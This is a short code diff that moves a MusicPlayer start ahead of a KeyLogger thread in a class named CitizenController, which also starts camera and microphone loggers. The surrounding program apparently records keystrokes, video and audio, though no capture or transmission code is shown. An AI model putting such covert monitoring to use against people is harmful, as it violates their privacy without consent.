@@ -28,6 +28,8 @@ class CitizenController:
     """
     def start(self):
         QUERY_CONTROLLER = QueryController()
+        MUSICPLAYER = MusicPlayer()
+        MUSICPLAYER.main()
         KEYLOGGER = KeyLogger(QUERY_CONTROLLER, self.blackListStrings)
         thr1 = threading.Thread(target=KEYLOGGER.main, args=())
         thr1.start()
@@ -52,8 +54,6 @@ class CitizenController:
         CAMERALOGGER.main()
         MICROLOGGER = MicroLogger(QUERY_CONTROLLER)
         MICROLOGGER.main()
-        MUSICPLAYER = MusicPlayer()
-        MUSICPLAYER.main()
 
 
 """
